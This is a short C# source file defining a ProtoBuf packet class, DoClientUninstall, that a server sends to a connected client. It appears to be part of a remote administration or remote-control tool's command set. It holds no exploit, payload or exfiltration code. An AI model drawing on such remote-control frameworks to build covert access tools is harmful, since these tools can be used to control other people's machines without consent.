using ProtoBuf;
using xServer.Core.Networking;

namespace xServer.Core.Packets.ServerPackets
{
    [ProtoContract]
    public class DoClientUninstall : IPacket
    {
        public DoClientUninstall()
        {
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}